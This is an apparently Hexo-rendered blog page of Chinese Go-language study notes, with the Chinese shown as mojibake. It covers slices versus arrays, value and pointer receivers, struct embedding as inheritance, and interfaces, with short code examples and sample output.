<h3 id="go-çš„åˆ‡ç‰‡"><a href="#go-çš„åˆ‡ç‰‡" class="headerlink" title="go çš„åˆ‡ç‰‡"></a>go çš„åˆ‡ç‰‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äº go è¯­è¨€çš„æ•°ç»„ï¼Œcopy å’Œ view æ˜¯åŒæ—¶éƒ½å­˜åœ¨çš„ã€‚</span><br><span class="line"></span><br><span class="line">copy å°±æ˜¯ä½¿ç”¨è¿™ä¸ªæ•°ç»„çš„æ—¶å€™æˆ‘å°†è¿™ä¸ªæ•°ç»„æ‹·è´ä¸€ä»½ï¼Œè¿™æ ·å¯¹äºæ•°ç»„çš„å¢åˆ æ”¹ï¼Œæ˜¯ä¸ä¼šæ”¹å˜åŸæ•°ç»„çš„å€¼çš„</span><br><span class="line">view ç”±æ•°ç»„æ‰§è¡Œåˆ‡ç‰‡æ‰€è¿”å›çš„å¯¹è±¡æ˜¯ä¸€ä¸ª viewï¼Œå³è§†å›¾ï¼Œè‹¥æˆ‘ä»¬åœ¨è§†å›¾ä¸Šæ“ä½œæ•°ç»„ï¼Œä¼šæ”¹å˜åŸæ•°ç»„ï¼Œ</span><br><span class="line">copy åœºæ™¯</span><br><span class="line"></span><br><span class="line">package  main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func  updateArr(arr [<span class="number">5</span>]int)  &#123;</span><br><span class="line">  arr[<span class="number">0</span>]  =  <span class="number">100</span></span><br><span class="line">  fmt.Println(<span class="string">"ä¿®æ”¹åçš„arrï¼š"</span>, arr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func  main()  &#123;</span><br><span class="line">  arr3  :=  [...]int&#123;<span class="number">2</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>&#125;</span><br><span class="line">  fmt.Println(<span class="string">"åŸæ¥çš„ï¼š"</span>, arr3)</span><br><span class="line">  updateArr(arr3)</span><br><span class="line">  fmt.Println(<span class="string">"å†æ¬¡æŸ¥çœ‹åŸå§‹çš„ï¼š"</span>, arr3)</span><br><span class="line">&#125;</span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">åŸæ¥çš„ï¼š [<span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">ä¿®æ”¹åçš„arrï¼š [<span class="number">100</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">å†æ¬¡æŸ¥çœ‹åŸå§‹çš„ï¼š [<span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">å¦‚ä¸Šä»£ç å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åœ¨ updateArr é‡Œé¢ä¿®æ”¹äº†ä¸‹æ ‡ä¸º <span class="number">0</span> çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬è¾“å‡ºåŸå§‹æ•°ç»„çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰å˜ã€‚è¿™å°±æ˜¯å¯¹æ•°ç»„ copyã€‚</span><br><span class="line"></span><br><span class="line">view åœºæ™¯</span><br><span class="line"></span><br><span class="line">func  updateArr(arr []int)  &#123;</span><br><span class="line">  arr[<span class="number">0</span>]  =  <span class="number">100</span></span><br><span class="line">  fmt.Println(<span class="string">"ä¿®æ”¹åçš„arrï¼š"</span>, arr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func  main()  &#123;</span><br><span class="line">  arr3  :=  [...]int&#123;<span class="number">2</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>&#125;</span><br><span class="line">  fmt.Println(<span class="string">"åŸæ¥çš„ï¼š"</span>, arr3)</span><br><span class="line">  <span class="comment">// ä½¿ç”¨åˆ‡ç‰‡</span></span><br><span class="line">  updateArr(arr3[:])</span><br><span class="line">  fmt.Println(<span class="string">"å†æ¬¡æŸ¥çœ‹åŸå§‹çš„ï¼š"</span>, arr3)</span><br><span class="line">&#125;</span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">åŸæ¥çš„ï¼š [<span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">ä¿®æ”¹åçš„arrï¼š [<span class="number">100</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">å†æ¬¡æŸ¥çœ‹åŸå§‹çš„ï¼š [<span class="number">100</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line">ä¸ºä»€ä¹ˆ view èƒ½å¤Ÿæ”¹å˜åŸæ•°ç»„</span><br><span class="line"></span><br><span class="line">è™½ç„¶ Slice æœ¬èº«æ˜¯å€¼ç±»å‹ï¼Œä½†æ˜¯å®ƒå†…éƒ¨ä½¿ç”¨äº†å¯¹æ•°ç»„çš„æŒ‡é’ˆå¼•ç”¨ï¼Œæ‰€ä»¥ä¿®æ”¹åˆ‡ç‰‡æ•°æ®ï¼Œä¼šå°†æ•°ç»„åŸæœ‰æ•°æ®ä¿®æ”¹æ‰ã€‚</span><br><span class="line"></span><br><span class="line">å½“ç„¶ï¼Œåœ¨ç†è§£ä¸Šé¢çš„åŒæ—¶ï¼Œä¸€å®šè¦çŸ¥é“ go æ˜¯å¦‚ä½•å®šä¹‰ä¸€ä¸ªåˆ‡ç‰‡çš„</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b []int</span><br><span class="line">æ‰€ä»¥ï¼Œåœ¨ updateArr è¿™ä¸ªå‡½æ•°ä¼ å‚çš„æ—¶å€™ arr []int æ˜¯ä¼ åˆ‡ç‰‡è¿›å»ã€‚ä¸ç„¶ä¼šæŠ¥é”™ https:<span class="comment">//learnku.com/articles/32171</span></span><br></pre></td></tr></table></figure>
<h3 id="ç»“æ„ä½“çš„å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’"><a href="#ç»“æ„ä½“çš„å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’" class="headerlink" title="ç»“æ„ä½“çš„å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’"></a>ç»“æ„ä½“çš„å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">å€¼ä¼ é€’</span><br><span class="line"></span><br><span class="line">type person struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">    gender string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•å®šä¹‰</span></span><br><span class="line">func (p person) setName(name string) &#123;</span><br><span class="line">    p.name = name</span><br><span class="line">    fmt.Println(<span class="string">"person name is:"</span>,  p.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p *person) describe() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"æˆ‘å« %v, æˆ‘ä»Šå¹´ %v äº†"</span>, p.name, p.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    p := person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125;</span><br><span class="line">    <span class="comment">// ä¿®æ”¹nameçš„å€¼</span></span><br><span class="line">    p.setName(<span class="string">"jury"</span>)</span><br><span class="line">    p.describe()</span><br><span class="line">&#125;</span><br><span class="line">å¦‚ä¸Šï¼Œæˆ‘ä»¬åœ¨ setName è¿™ä¸ªå‡½æ•°çš„æ¥å—è€… æ˜¯ p personã€‚ æ­¤æ—¶ï¼Œå°±ç›¸å½“äºæŠŠ person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125; æ‹·è´ä¸€ä»½ä¼ é€’è¿‡å»ã€‚</span><br><span class="line">å¼•ç”¨ä¼ é€’</span><br><span class="line"></span><br><span class="line">å¼•ç”¨ä¼ é€’å°±æ˜¯å°†è¯¥å€¼åœ¨å†…å­˜ä¸­çš„å­˜å‚¨åœ°å€ä¼ é€’è¿‡å»ã€‚</span><br><span class="line"></span><br><span class="line">type person struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">    gender string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•å®šä¹‰</span></span><br><span class="line">func (p *person) setName(name string) &#123;</span><br><span class="line">    p.name = name</span><br><span class="line">    fmt.Println(<span class="string">"person name is:"</span>,  p.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p *person) describe() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"æˆ‘å« %v, æˆ‘ä»Šå¹´ %v äº†"</span>, p.name, p.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    p := person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125;</span><br><span class="line">    <span class="comment">// ä¿®æ”¹nameçš„å€¼</span></span><br><span class="line">    p.setName(<span class="string">"jury"</span>)</span><br><span class="line">    p.describe()</span><br><span class="line">&#125;</span><br><span class="line">æˆ‘ä»¬åœ¨ setName è¿™ä¸ªå‡½æ•°çš„æ¥å—è€… æ˜¯ p *personã€‚ æ­¤æ—¶ï¼Œå°±ç›¸å½“äºæŠŠ person&#123;<span class="string">"Tom"</span>, <span class="number">22</span>, <span class="string">"man"</span>&#125; å­˜å‚¨åœ°å€ä¼ é€’è¿‡å»ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32233</span></span><br></pre></td></tr></table></figure>
<h3 id="å®ç°ç»§æ‰¿"><a href="#å®ç°ç»§æ‰¿" class="headerlink" title="å®ç°ç»§æ‰¿"></a>å®ç°ç»§æ‰¿</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">"fmt"</span></span><br><span class="line">  <span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ¨ç‰©ç±»</span></span><br><span class="line">type Animal struct &#123;</span><br><span class="line">  name string</span><br><span class="line">  subject string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ¨ç‰©çš„å…¬å…±æ–¹æ³•</span></span><br><span class="line">func (a *Animal) eat(food string) &#123;</span><br><span class="line">  fmt.Println(a.name + <span class="string">"å–œæ¬¢åƒï¼š"</span> + food +<span class="string">",å®ƒå±äº:"</span> + a.subject)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çŒ«ç±»ï¼Œç»§æ‰¿åŠ¨ç‰©ç±»https://learnku.com/articles/32295#reply102908</span></span><br><span class="line">type Cat struct &#123;</span><br><span class="line">  <span class="comment">// ç»§æ‰¿åŠ¨ç‰©çš„å±æ€§å’Œæ–¹æ³•</span></span><br><span class="line">  Animal</span><br><span class="line">  <span class="comment">// çŒ«è‡ªå·±çš„å±æ€§</span></span><br><span class="line">  age int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çŒ«ç±»ç‹¬æœ‰çš„æ–¹æ³• type name struct&#123;&#125; ç»“æ„ä½“ å°±ç›¸å½“äºå…¶ä»–è¯­è¨€ä¸­çš„ class ç±»çš„æ¦‚å¿µã€‚</span></span><br><span class="line">func (c Cat) sleep() &#123;</span><br><span class="line">  fmt.Println(c.name + " ä»Šå¹´" + strconv.Itoa(c.age) + "å²äº†,ç‰¹åˆ«å–œæ¬¢ç¡è§‰")# go è¯­è¨€ä¸­ï¼Œstring + intï¼Œå¦‚æœæƒ³è¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™éœ€è¦å¯¹ int ç±»å‹çš„å€¼è½¬æ¢ä¸º string ç±»å‹ï¼Œç„¶åæ‰èƒ½æ‹¼æ¥ã€‚</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  <span class="comment">// åˆ›å»ºä¸€ä¸ªåŠ¨ç‰©ç±»</span></span><br><span class="line">  animal := Animal&#123;<span class="attr">name</span>:<span class="string">"åŠ¨ç‰©"</span>, <span class="attr">subject</span>:<span class="string">"åŠ¨ç‰©ç§‘"</span>&#125;</span><br><span class="line">  animal.eat(<span class="string">"è‚‰"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ›å»ºä¸€ä¸ªçŒ«ç±»</span></span><br><span class="line">  cat := Cat&#123;<span class="attr">Animal</span>: Animal&#123;<span class="attr">name</span>:<span class="string">"å’ªå’ª"</span>, <span class="attr">subject</span>:<span class="string">"çŒ«ç§‘"</span>&#125;,<span class="attr">age</span>:<span class="number">1</span>&#125;</span><br><span class="line">  cat.eat(<span class="string">"é±¼"</span>)</span><br><span class="line">  cat.sleep()</span><br><span class="line">&#125;</span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    åŠ¨ç‰©å–œæ¬¢åƒï¼šè‚‰,å®ƒå±äº:åŠ¨ç‰©ç§‘</span><br><span class="line">    å’ªå’ªå–œæ¬¢åƒï¼šé±¼,å®ƒå±äº:çŒ«ç§‘</span><br><span class="line">    å’ªå’ª ä»Šå¹´<span class="number">1</span>å²äº†,ç‰¹åˆ«å–œæ¬¢ç¡è§‰</span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœä¹‹å‰å­¦è¿‡ PHP æˆ–è€…å…¶ä»–è¯­è¨€ï¼Œå¯ä»¥çŸ¥é“å®ç°ä¸€ä¸ªæ¥å£ï¼Œä¸ä»…éœ€è¦å®ç°å…¶æ¥å£é‡Œçš„æ–¹æ³•ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨ implements æ˜¾å¼è¯´æ˜å…¶å®ç°äº†è¯¥æ¥å£ã€‚</span><br><span class="line">go åˆ™æ˜¯ duck typeï¼Œå³åƒé¸­å­ï¼Œé‚£å®ƒå°±å¯ä»¥æ˜¯ä¸ªé¸­å­ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ go ä¸­ï¼Œæ˜¯è¦æ˜¯ç»“æ„ä½“å®ç°äº†æŸä¸ªæ¥å£æŒ‡å®šçš„æ–¹æ³•ï¼Œé‚£å®ƒå°±æ˜¯å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œä¸éœ€è¦ä½¿ç”¨ implements æ˜¾å¼è¯´æ˜ã€‚</span><br><span class="line"></span><br><span class="line">ç°åœ¨è¯´ä¸€ä¸‹æ¥å£ä¼˜ç‚¹ï¼Œæœ€å¤§çš„è«è¿‡äºæ§åˆ¶åè½¬å’Œè§£è€¦ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚è®¾è®¡ä¸€ä¸ªå‘é€çŸ­ä¿¡çš„æœåŠ¡ï¼Œæˆ‘æƒ³æ¥å…¥é˜¿é‡Œäº‘ä¸è…¾è®¯äº‘çš„çŸ­ä¿¡ä¸šåŠ¡ï¼Œæ­¤æ—¶åº”è¯¥å¦‚ä½•è®¾è®¡æ¯”è¾ƒå¥½ï¼Ÿæ˜¯åœ¨æœ€åº•å±‚é€šè¿‡ type åˆ†ç±»æ¥åŒºåˆ†ï¼Œè¿˜æ˜¯åœ¨ä¸Šå±‚é€šè¿‡ä¼ å…¥ä¸åŒçš„æœåŠ¡ï¼Œæ¥å¯¹åº”å‘é€ä¸åŒçš„è¿è¥å•†çŸ­ä¿¡æ¯”è¾ƒä¼˜é›…ï¼Ÿå…¶å®çœ‹ laravel æ¡†æ¶ä¸Šçš„å®ç°å°±å¾ˆæ˜ç™½äº†ã€‚</span><br><span class="line"></span><br><span class="line">åŒæ—¶ï¼Œgo ä¸­çš„å¤šæ€çš„ç‰¹æ€§é€šè¿‡æ¥å£æ¥å±•ç°çš„ã€‚</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">type Usb interface &#123;</span><br><span class="line">    Start()</span><br><span class="line">    Stop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Phone struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p Phone) Start() &#123;</span><br><span class="line">    p.Name = <span class="string">"å¼ ä¸‰"</span> <span class="comment">//è¿™é‡Œå¯¹å¼•ç”¨ä¼ é€’è¿˜æ˜¯å€¼ä¼ é€’çš„ä½œç”¨ä¸€æ ·ç”Ÿæ•ˆï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰å˜åŒ–</span></span><br><span class="line">    fmt.Println(<span class="string">"æ‰‹æœºå¼€å§‹å·¥ä½œäº†..."</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p Phone) Stop() &#123;</span><br><span class="line">    fmt.Println(p.Name) <span class="comment">//æå››</span></span><br><span class="line">    fmt.Println(<span class="string">"æ‰‹æœºåœæ­¢å·¥ä½œäº†..."</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Carame struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (c *Carame) Start() &#123;</span><br><span class="line">    c.Name = <span class="string">"å¼ ä¸‰"</span> <span class="comment">//è¿™é‡Œå¯¹å¼•ç”¨ä¼ é€’è¿˜æ˜¯å€¼ä¼ é€’çš„ä½œç”¨ä¸€æ ·ç”Ÿæ•ˆï¼Œæ‰€ä»¥è¿™é‡Œæœ‰å˜åŒ–</span></span><br><span class="line">    fmt.Println(<span class="string">"ç›¸æœºå¼€å§‹å·¥ä½œäº†..."</span>)</span><br><span class="line">&#125;</span><br><span class="line">func (c *Carame) Stop() &#123;</span><br><span class="line">    fmt.Println(c.Name) <span class="comment">//å¼ ä¸‰</span></span><br><span class="line">    fmt.Println((*c).Name) <span class="comment">//å¼ ä¸‰</span></span><br><span class="line">    fmt.Println(<span class="string">"ç›¸æœºåœæ­¢å·¥ä½œäº†..."</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Computer struct &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Usbæ˜¯å‰é¢å®šä¹‰çš„æ¥å£ï¼Œè¿™é‡Œè°ƒç”¨çš„2ä¸ªå‡½æ•°ï¼Œåœ¨ç»“æ„ä½“ä¸­ä¸€å®šéƒ½è¦æœ‰å£°æ˜è¿‡ï¼Œå¦åˆ™æŠ¥é”™ã€‚</span></span><br><span class="line">func (com *Computer) Working(usb Usb) &#123;</span><br><span class="line">    usb.Start()</span><br><span class="line">    usb.Stop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="keyword">var</span> phone = Phone&#123;&#125;</span><br><span class="line">    phone.Name = <span class="string">"æå››"</span></span><br><span class="line">    <span class="keyword">var</span> carame = Carame&#123;&#125;</span><br><span class="line">    carame.Name = <span class="string">"æå››"</span></span><br><span class="line">    <span class="keyword">var</span> computer = Computer&#123;&#125;</span><br><span class="line">    <span class="comment">//è¿™é‡Œä¼ å…¥å‚æ•°æ˜¯åœ°å€è¿˜æ˜¯å¯¹è±¡ï¼Œéœ€è¦ä¾é åŸç»“æ„ä½“é‡Œå®šä¹‰çš„æ–¹æ³•æ¥åˆ¤æ–­(æ¯”å¦‚Phoneç»“æ„ä½“)ã€‚æ¯”å¦‚Phoneç»“æ„ä½“ä¸­çš„startæ–¹æ³•æ˜¯pï¼Œæ­¤æ—¶Workingä¼ å…¥å¯¹è±¡è¿˜æ˜¯åœ°å€éƒ½å¯ä»¥ã€‚å¦‚æœæ˜¯*pï¼Œåˆ™å¿…é¡»ä¼ å…¥åœ°å€ã€‚ä¸comçš„ç±»å‹æ— å…³ã€‚</span></span><br><span class="line">    computer.Working(&amp;phone)</span><br><span class="line">    computer.Working(&amp;carame)</span><br><span class="line">    <span class="comment">//æœ€åè¾“å‡º</span></span><br><span class="line">    <span class="comment">// æ‰‹æœºå¼€å§‹å·¥ä½œäº†...</span></span><br><span class="line">    <span class="comment">// æå››</span></span><br><span class="line">    <span class="comment">// æ‰‹æœºåœæ­¢å·¥ä½œäº†...</span></span><br><span class="line">    <span class="comment">// ç›¸æœºå¼€å§‹å·¥ä½œäº†...</span></span><br><span class="line">    <span class="comment">// å¼ ä¸‰</span></span><br><span class="line">    <span class="comment">// ç›¸æœºåœæ­¢å·¥ä½œäº†...</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/32266</span></span><br></pre></td></tr></table></figure></p>
<h3 id="é¢å‘å¯¹è±¡ç‰¹æ€§"><a href="#é¢å‘å¯¹è±¡ç‰¹æ€§" class="headerlink" title="é¢å‘å¯¹è±¡ç‰¹æ€§"></a>é¢å‘å¯¹è±¡ç‰¹æ€§</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">æ¥å£ä½¿ç”¨ interface å…³é”®å­—å£°æ˜ï¼Œä»»ä½•å®ç°æ¥å£å®šä¹‰æ–¹æ³•çš„ç±»éƒ½å¯ä»¥å®ä¾‹åŒ–è¯¥æ¥å£ï¼Œæ¥å£å’Œå®ç°ç±»ä¹‹é—´æ²¡æœ‰ä»»ä½•ä¾èµ–</span><br><span class="line">type Sayer interface &#123;</span><br><span class="line">    Say(message string)</span><br><span class="line">    SayHi()</span><br><span class="line">&#125;</span><br><span class="line">ç»§æ‰¿ä½¿ç”¨ç»„åˆçš„æ–¹å¼å®ç°</span><br><span class="line"></span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (a *Animal) Say(message string) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Animal[%v] say: %v\n"</span>, a.Name, message)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Dog struct &#123;</span><br><span class="line">    Animal</span><br><span class="line">&#125;</span><br><span class="line">Dog å°†ç»§æ‰¿ Animal çš„ Say æ–¹æ³•ï¼Œä»¥åŠå…¶æˆå‘˜ Name</span><br><span class="line">å­ç±»å¯ä»¥é‡æ–°å®ç°çˆ¶ç±»çš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="comment">// override Animal.Say</span></span><br><span class="line">func (d *Dog) Say(message string) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Dog[%v] say: %v\n"</span>, d.Name, message)</span><br><span class="line">&#125;</span><br><span class="line">Dog.Say å°†è¦†ç›– Animal.Say</span><br><span class="line"><span class="keyword">var</span> sayer Sayer</span><br><span class="line"></span><br><span class="line">sayer = &amp;Dog&#123;Animal&#123;<span class="attr">Name</span>: <span class="string">"Yoda"</span>&#125;&#125;</span><br><span class="line">sayer.Say(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure>
